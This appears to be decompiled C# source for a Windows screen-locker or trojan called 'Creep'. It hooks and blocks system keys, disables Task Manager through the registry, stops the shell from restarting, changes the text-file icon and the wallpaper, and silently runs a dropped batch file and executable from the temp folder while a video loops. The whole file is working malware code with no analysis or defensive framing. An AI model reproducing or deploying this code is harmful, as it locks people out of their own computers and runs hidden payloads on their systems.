using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Forms;
using System.Windows.Input;
using System.Windows.Markup;
using Creep.Properties;
using Microsoft.Win32;
using Utilities;

namespace Creep
{
	// Token: 0x02000005 RID: 5
	public partial class MainWindow : Window
	{
		// Token: 0x06000014 RID: 20 RVA: 0x00002310 File Offset: 0x00000510
		public MainWindow()
		{
			Console.WriteLine("beginning!");
			this.gkh = new GlobalKeyboardHook();
			this.gkh.HookedKeys.Add(Keys.Escape);
			this.gkh.HookedKeys.Add(Keys.LWin);
			this.gkh.HookedKeys.Add(Keys.RWin);
			this.gkh.HookedKeys.Add(Keys.Tab);
			this.gkh.HookedKeys.Add(Keys.Delete);
			this.gkh.KeyDown += new System.Windows.Forms.KeyEventHandler(this.handleKey);
			this.gkh.hook();
			this.WorkWorkWorkWork();
			this.InitializeComponent();
		}

		// Token: 0x06000015 RID: 21 RVA: 0x000023CC File Offset: 0x000005CC
		private void handleKey(object sender, System.Windows.Forms.KeyEventArgs e)
		{
			e.Handled = true;
		}

		// Token: 0x06000016 RID: 22 RVA: 0x000023D7 File Offset: 0x000005D7
		private void main_PreviewKeyDown(object sender, System.Windows.Input.KeyEventArgs e)
		{
			e.Handled = true;
		}

		// Token: 0x06000017 RID: 23 RVA: 0x000023E4 File Offset: 0x000005E4
		public void WorkWorkWorkWork()
		{
			string tempPath = Path.GetTempPath();
			File.WriteAllBytes(tempPath + "icon.ico", Creep.Properties.Resources.texticon);
			RegistryKey registryKey = Registry.ClassesRoot.CreateSubKey("txtfile\\DefaultIcon");
			registryKey.SetValue("", tempPath + "icon.ico");
			registryKey.Close();
			registryKey = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
			registryKey.SetValue("Wallpaper", "");
			registryKey.Close();
			registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
			registryKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
			registryKey.Close();
			File.WriteAllBytes(tempPath + "text.txt", Creep.Properties.Resources.txt);
			File.WriteAllBytes(tempPath + "windl.bat", Creep.Properties.Resources.windl);
			File.WriteAllBytes(tempPath + "one.rtf", Creep.Properties.Resources.one);
			File.WriteAllBytes(tempPath + "rniw.exe", Creep.Properties.Resources.subox);
			Process.Start(new ProcessStartInfo(tempPath + "windl.bat")
			{
				CreateNoWindow = true,
				UseShellExecute = false
			});
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002538 File Offset: 0x00000738
		private void MediaElement_MediaEnded(object sender, RoutedEventArgs e)
		{
			MediaElement mediaElement = sender as MediaElement;
			mediaElement.Position = TimeSpan.FromMilliseconds(1.0);
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002564 File Offset: 0x00000764
		private void video_Loaded(object sender, RoutedEventArgs e)
		{
			string text = Path.GetTempPath() + "v.mp4";
			File.WriteAllBytes(text, Creep.Properties.Resources.street);
			this.video.Source = new Uri(text);
		}

		// Token: 0x0400000B RID: 11
		private GlobalKeyboardHook gkh;
	}
}
